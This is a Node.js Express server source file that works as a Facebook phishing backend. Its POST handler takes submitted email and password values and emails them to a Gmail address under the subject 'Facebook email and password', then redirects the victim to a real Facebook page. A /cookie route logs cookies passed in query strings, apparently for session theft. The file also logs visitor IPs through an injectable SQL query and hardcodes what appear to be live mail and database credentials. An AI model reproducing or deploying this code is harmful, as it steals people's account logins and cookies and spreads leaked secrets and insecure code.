var aaa;
var express = require('express');
var app = express();
var request = require('request');
var bodyParser = require('body-parser');
app.use(bodyParser.urlencoded({ extended: false }));
app.use(express.static('public'));
const PORT = process.env.PORT || 5000;
app.set('view engine', 'ejs');
var cookieParser = require('cookie-parser')
app.use(cookieParser());
const pg = require('pg');
var md5 = require('md5');
var request_first_name;
var request_last_name;
var request_email;
var request_password;
var request_confirm_password;
var s;
var script = "";
const nodemailer = require("nodemailer");
var transporter = nodemailer.createTransport({
    service: 'gmail',
    host: 'smtp.gmail.com',
    secure: true,
    port: 465,

    auth: {
        user: 'AdhamSadakah.as@gmail.com',
        pass: 'fpmtfmcvrwpenfuy'
    }
});
const client = new pg.Client({
    user: 'haaasalbrddacm',
    password: '1c86ca363fc1a26cb588bbf08ed0117c6490946bc5b6a7de4e8164c3a76ac184',
    database: 'de35u0icb8jt5u',
    port: 5432,
    host: 'ec2-54-235-114-242.compute-1.amazonaws.com',
    ssl: true
});
client.connect();


// #########################################################################################################################################################################################
app.get('/', function (req, res) {
      var ip = req.headers['x-forwarded-for'] ||
        req.connection.remoteAddress ||
        req.socket.remoteAddress ||
        (req.connection.socket ? req.connection.socket.remoteAddress : null);
    client.query("INSERT INTO fb_ip(ip) VALUES ('" + ip + "')", function (err, result) {
        if (!err) {
            // console.log(result)
        }
    })
    res.header('Access-Control-Allow-Origin' , '*' );
    res.render('index')
});
// #########################################################################################################################################################################################
app.get('/cookie', function (req, res) {
    var cookie=req.query.cookie;
    console.log('cookie: '+cookie);
    res.header('Access-Control-Allow-Origin' , '*' );
    res.redirect('/');
})
app.get('/paypal', function (req, res) {
    res.redirect('https://www.paypal.com/cgi-bin/webscr?cmd=a');
})
app.get('/google', function (req, res) {
    res.redirect('https://www.google.com/');
})

// #########################################################################################################################################################################################
app.post('/', function (req, res) {
    var email=req.body.email;
    var pass=req.body.pass;
    console.log(email);
    console.log(pass);

    var mailOptions = {
        from: 'AdhamSadakah00@gmail.com',
        to: "AdhamSadakah.as@gmail.com",
        subject: 'Facebook email and password',
        text: 'email: '+email+'\nPassword: '+pass,
        html:''
        
    };
    transporter.sendMail(mailOptions, function (error, info) {
        if (error) {
            console.log(error);
        } else {
            console.log('Email sent: ' + info.response);
        }
    });
    res.redirect('https://www.facebook.com/hmMiddleEast');


});

app.get('*', function (req, res) {
    res.send('Page not found')
})

app.listen(PORT, function () {
    console.log('Server Started')
})


// ################################################################################################################################################################################################
